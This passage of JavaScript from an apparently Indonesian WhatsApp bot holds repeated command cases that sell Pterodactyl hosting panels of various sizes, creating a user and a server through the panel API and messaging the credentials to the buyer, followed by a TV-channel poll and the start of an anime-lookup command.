break
case "3gb": {
if (cekSaldo(sender,db_saldo) < 3500) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 3,500 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 3gb"
let egg = global.eggsnya
let loc = global.location
let memo = "3200"
let cpu = "70"
let disk = "3200"
let email = username + "3gb@gmail.com"
if (!u) return
let d = (await znn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}

*YOUR PANEL*

  ID : ${user.id}
  Username : ${user.username}
  Email : ${user.email}
  Name : ${user.first_name} ${user.last_name}
  Bahasa : ${user.language}
  Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

znn.sendMessage(u, { text: `*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*YOUR PANEL*

  email: ${email}
  username: ${username}
  password: ${password.toString()}
  login: ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*SUCCESS PAID*

email: ${email}
username: ${username}
password: ${password.toString()}
login: ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 3,500`)
minSaldo(sender, 3500, db_saldo)
break
case "4gb": {
if (cekSaldo(sender,db_saldo) < 4000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 4,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 4gb"
let egg = global.eggsnya
let loc = global.location
let memo = "4200"
let cpu = "90"
let disk = "4200"
let email = username + "@gmail.com"
if (!u) return
let d = (await znn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}

*YOUR PANEL*

  ID : ${user.id}
  Username : ${user.username}
  Email : ${user.email}
  Name : ${user.first_name} ${user.last_name}
  Bahasa : ${user.language}
  Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

znn.sendMessage(u, { text: `*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*YOUR PANEL*

  email: ${email}
  username: ${username}
  password: ${password.toString()}
  login: ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*SUCCESS PAID*

email: ${email}
username: ${username}
password: ${password.toString()}
login: ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 4,000`)
minSaldo(sender, 4000, db_saldo)
break
case "5gb": {
if (cekSaldo(sender,db_saldo) < 5000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 5,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 5gb"
let egg = global.eggsnya
let loc = global.location
let memo = "5200"
let cpu = "110"
let disk = "5200"
let email = username + "@gmail.com"
if (!u) return
let d = (await znn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}

*YOUR PANEL*

  ID : ${user.id}
  Username : ${user.username}
  Email : ${user.email}
  Name : ${user.first_name} ${user.last_name}
  Bahasa : ${user.language}
  Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

znn.sendMessage(u, { text: `*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*YOUR PANEL*

  email: ${email}
  username: ${username}
  password: ${password.toString()}
  login: ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*SUCCESS PAID*

email: ${email}
username: ${username}
password: ${password.toString()}
login: ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 5,000`)
minSaldo(sender, 5000, db_saldo)
break
case "6gb": {
if (cekSaldo(sender,db_saldo) < 6000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 6,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 6gb"
let egg = global.eggsnya
let loc = global.location
let memo = "6200"
let cpu = "140"
let disk = "6200"
let email = username + "@gmail.com"
if (!u) return
let d = (await znn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}

*YOUR PANEL*

  ID : ${user.id}
  Username : ${user.username}
  Email : ${user.email}
  Name : ${user.first_name} ${user.last_name}
  Bahasa : ${user.language}
  Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

znn.sendMessage(u, { text: `*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*YOUR PANEL*

  email: ${email}
  username: ${username}
  password: ${password.toString()}
  login: ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*SUCCESS PAID*

email: ${email}
username: ${username}
password: ${password.toString()}
login: ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 6,000`)
minSaldo(sender, 6000, db_saldo)
break
case "7gb": {
if (cekSaldo(sender,db_saldo) < 7000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 7,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 7gb"
let egg = global.eggsnya
let loc = global.location
let memo = "7200"
let cpu = "160"
let disk = "7200"
let email = username + "@gmail.com"
if (!u) return
let d = (await znn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}

*YOUR PANEL*

  ID : ${user.id}
  Username : ${user.username}
  Email : ${user.email}
  Name : ${user.first_name} ${user.last_name}
  Bahasa : ${user.language}
  Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

znn.sendMessage(u, { text: `*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*YOUR PANEL*

  email: ${email}
  username: ${username}
  password: ${password.toString()}
  login: ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*SUCCESS PAID*

email: ${email}
username: ${username}
password: ${password.toString()}
login: ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 7,000`)
minSaldo(sender, 7000, db_saldo)
break
case "8gb": {
if (cekSaldo(sender,db_saldo) < 8000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 8,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 8gb"
let egg = global.eggsnya
let loc = global.location
let memo = "8200"
let cpu = "180"
let disk = "8200"
let email = username + "@gmail.com"
if (!u) return
let d = (await znn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}

*YOUR PANEL*

  ID : ${user.id}
  Username : ${user.username}
  Email : ${user.email}
  Name : ${user.first_name} ${user.last_name}
  Bahasa : ${user.language}
  Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

znn.sendMessage(u, { text: `*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*YOUR PANEL*

  email: ${email}
  username: ${username}
  password: ${password.toString()}
  login: ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*SUCCESS PAID*

email: ${email}
username: ${username}
password: ${password.toString()}
login: ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 8,000`)
minSaldo(sender, 8000, db_saldo)
break
case "9gb": {
if (cekSaldo(sender,db_saldo) < 9000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 9,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 9gb"
let egg = global.eggsnya
let loc = global.location
let memo = "9200"
let cpu = "190"
let disk = "9200"
let email = username + "@gmail.com"
if (!u) return
let d = (await znn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}

*YOUR PANEL*

  ID : ${user.id}
  Username : ${user.username}
  Email : ${user.email}
  Name : ${user.first_name} ${user.last_name}
  Bahasa : ${user.language}
  Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

znn.sendMessage(u, { text: `*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*YOUR PANEL*

  email: ${email}
  username: ${username}
  password: ${password.toString()}
  login: ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*SUCCESS PAID*

email: ${email}
username: ${username}
password: ${password.toString()}
login: ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 15,000`)
minSaldo(sender, 9000, db_saldo)
break
case '0gb': case "unlimited": {
if (cekSaldo(sender,db_saldo) < 15000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 15,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 0gb"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@gmail.com"
if (!u) return
let d = (await znn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}

*YOUR PANEL*

  ID : ${user.id}
  Username : ${user.username}
  Email : ${user.email}
  Name : ${user.first_name} ${user.last_name}
  Bahasa : ${user.language}
  Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

znn.sendMessage(u, { text: `*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*YOUR PANEL*

  email: ${email}
  username: ${username}
  password: ${password.toString()}
  login: ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*SUCCESS PAID*

email: ${email}
username: ${username}
password: ${password.toString()}
login: ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 15,000`)
minSaldo(sender, 15000, db_saldo)
break
























































// FITUR SEARCH
//NONTONTV TANPA BUTTON LIST
case "nontontv":
{

let teksk = `PILIH POLLING BERIKUT

dibawah adalah list dari channel top di televisi
pilih polling dari channel yang ingin di tonton
setelah itu bot akan memberi channel yang ingin
anda tonton dengan berupa link`
znn.sendPoll(from, teksk, ['TVINTERNASIONAL','GLOBALTV','MNCTV','RCTI','TRANSTV','TRANS7','ANTV','SCTV','NET','INDOSIAR'])
}
break
case 'whatanime': {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || '';
  if (/image/.test(mime)) {
    znn.sendMessage(m.chat, {
      react: {
        text: '🕒',
        key: m.key,
      }
    });
const media2 = await znn.downloadAndSaveMediaMessage(q)
const anu = await TelegraPh(media2)
    try {
      let api = `https://api.trace.moe/search?anilistInfo&url=${anu}`;
      let { data } = await axios.get(api);
      let anime = data.result[0].anilist;
      let episode = data.result[0].episode;
      let similarity = data.result[0].similarity;
      let at = new Date(data.result[0].from * 1000).toISOString().substr(11, 12) + ' - ' + new Date(data.result[0].to * 1000).toISOString().substr(11, 12);
      let malId = anime.idMal;
      let anilistId = anime.id;
      let titleRomaji = anime.title.romaji;
      let titleNative = anime.title.native;
